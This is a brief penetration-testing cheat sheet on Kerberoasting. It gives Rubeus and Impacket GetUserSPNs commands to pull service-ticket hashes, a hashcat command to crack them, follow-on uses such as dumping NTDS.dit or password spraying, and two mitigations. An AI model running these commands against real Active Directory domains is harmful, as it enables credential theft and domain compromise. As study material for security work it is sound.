# Kerberoasting
Kerberoasting allows a user to request a service ticket for any service with a registered *SPN(Service Principal Name)* then use that ticket to crack the **service account** password.

This is essentially cracking the password for a Service Account, which is tied to a particular service.

**Rubeus.exe**
Run this locally on an AD machine.

*Dump the hashes.*
```
`Rubeus.exe kerberoast`
```

*Crack the hash!*
```
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

**Impacket GetUserSPNs.py**
This is the same output as above but can be done over a network.

```
sudo python3 GetUserSPNs.py DOMAIN_CONTROLLER/USER:PASS -dc-ip DOMAIN_CONTROLLER_IP -request

```

```
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

**Uses for Service Accounts**
- If it is a domain admin, you have a golden ticket and could dump the global password hash file NTDS.dit
- If it is not a domain admin, you can login to other services, or spray that password against other accounts.

#### Kerberoasting Mitigation
- Strong Service Passwords - *If the service account passwords are strong then kerberoasting will be ineffective*
- Don't Make Service Accounts Domain Admins - *Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.*